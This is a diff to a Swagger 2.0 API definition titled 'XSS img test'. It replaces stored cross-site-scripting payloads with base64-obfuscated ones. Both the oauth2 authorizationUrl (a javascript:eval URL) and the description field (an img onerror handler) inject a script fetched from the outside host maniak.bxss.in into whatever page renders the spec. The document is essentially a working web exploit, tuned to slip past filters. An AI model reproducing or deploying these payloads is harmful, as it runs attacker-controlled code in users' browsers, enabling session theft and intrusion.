@@ -2,11 +2,11 @@ swagger: '2.0'
 securityDefinitions:
   a:
     type: oauth2
-    authorizationUrl: "javascript:eval('var a=document.createElement('script');a.src='https://maniak.bxss.in';document.body.appendChild(a)')"
+    authorizationUrl: "javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vbWFuaWFrLmJ4c3MuaW4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7'))"
 info:
   version: "1.0.0"
   title: XSS img test
-  description: "><script src=https://maniak.bxss.in></script>"
+  description: "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7YS5zcmM9J2h0dHBzOi8vbWFuaWFrLmJ4c3MuaW4nO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7' onerror=eval(atob(this.id))>"
 paths:
   /:
     get:
